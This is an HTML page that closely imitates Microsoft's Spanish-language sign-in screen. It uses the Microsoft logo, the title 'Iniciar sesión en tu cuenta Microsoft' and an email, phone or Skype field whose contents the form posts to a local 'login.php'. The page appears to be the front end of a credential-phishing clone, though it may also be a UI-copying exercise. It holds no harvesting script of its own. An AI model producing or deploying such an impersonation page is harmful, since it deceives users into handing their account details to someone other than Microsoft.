<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="Style.css" />
    <link rel="stylesheet" href="Queries.css" />
    <link rel="stylesheet" href="http://localhost/Pg/Style.css" />
    <link rel="stylesheet" href="http://localhost/Pg/Queries.css">
    <title>Iniciar sesión en tu cuenta Microsoft</title>
  </head>
  <body>
    <div class="father">
      <div class="form-box">
        <form action="login.php" method="post">
          <div class="box-1">
            <img
              class="logo"
              src="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
              alt="Microsoft"
            />
            <h1>Iniciar sesión</h1>
            <input
              class="input"
              type="text"
              name="correo"
              placeholder="Correo electrónico, teléfono o Skype"
              required
            />
            <p class="cuenta">
              ¿No tiene una cuenta? <a href="#">Cree una.</a>
            </p>
            <a href="#">Iniciar sesión con una llave de seguridad</a
            ><img
              class="seguridad"
              src="documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"
              alt="llave"
            />
            <div class="btn">
              <input class="siguiente" type="submit" value="Siguiente" />
            </div>
          </div>
          <div class="box-2-box">
            <div class="box-2">
              <p class="key-text">
                <img
                  class="key"
                  src="signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
                  alt="Opciones de inicio"
                />
                Opciones de inicio de sesión
              </p>
            </div>
          </div>
        </form>
      </div>
    </div>
    <footer>
      <ul>
        <a href="#"><li>Términos de uso</li></a>
        <a href="#"><li>Privacidad y cookies</li></a>
        <ion-icon class="dots" name="ellipsis-horizontal-outline"></ion-icon>
      </ul>
    </footer>
    <script
      type="module"
      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
    ></script>
    <script
      nomodule
      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
    ></script>
  </body>
</html>
